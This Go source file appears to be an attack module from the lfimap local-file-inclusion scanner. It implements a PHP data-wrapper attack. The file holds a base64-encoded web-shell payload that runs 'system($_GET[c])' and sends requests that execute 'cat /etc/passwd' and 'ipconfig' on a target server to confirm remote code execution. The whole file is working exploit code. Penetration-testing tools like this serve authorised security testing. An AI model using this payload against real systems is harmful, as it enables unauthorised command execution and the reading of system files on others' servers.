package attacks

import (
	"fmt"
	"net/url"
	"strings"

	lfihttp "github.com/hansmach1ne/lfimap/internal/http"
	"github.com/hansmach1ne/lfimap/internal/util"
)

// DataAttack implements PHP data wrapper attack
type DataAttack struct{}

// Name returns the attack name
func (a *DataAttack) Name() string {
	return "data"
}

// Test executes the data wrapper attack
func (a *DataAttack) Test(ctx *AttackContext, targetURL, postData string) bool {
	if ctx.Verbose {
		fmt.Printf("%s Testing with data wrapper...\n", ctx.Colors.Blue("[i]"))
	}

	placeholder := ctx.Config.Args.Placeholder
	headers := lfihttp.HeadersToMap(lfihttp.InitHeaders(
		ctx.Config.Args.UserAgent,
		ctx.Config.Args.Referer,
		ctx.Config.Args.Cookie,
	))

	// Base64 encoded: <?php system($_GET[c]); ?>
	basePayload := "data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K"

	// If parameter is in URL
	if strings.Contains(targetURL, placeholder) {
		tests := []string{
			basePayload + "&c=cat%20%2Fetc%2Fpasswd",
			basePayload + "&c=ipconfig",
		}

		for _, test := range tests {
			u, reqHeaders, postTest := lfihttp.PrepareRequest(placeholder, test, targetURL, postData, headers, ctx.Encodings)
			result := lfihttp.Request(ctx.HTTPCtx, u, reqHeaders, postTest, "RCE", "DATA", false, false, false)

			if !result.DoContinue {
				return true
			}
		}
		return false
	}

	// Determine URL separator based on existing query params
	parsedURL, err := url.Parse(targetURL)
	var urls []string
	if err != nil || parsedURL.RawQuery == "" {
		urls = []string{"?c=cat%20%2Fetc%2Fpasswd", "?c=ipconfig"}
	} else {
		urls = []string{"&c=cat%20%2Fetc%2Fpasswd", "&c=ipconfig"}
	}

	for _, urlSuffix := range urls {
		u, reqHeaders, postTest := lfihttp.PrepareRequest(placeholder, basePayload, targetURL, postData, headers, ctx.Encodings)
		result := lfihttp.Request(ctx.HTTPCtx, u+util.Encode(urlSuffix, ctx.Encodings), reqHeaders, postTest, "RCE", "DATA", false, false, false)

		if !result.DoContinue {
			return true
		}
	}

	return false
}
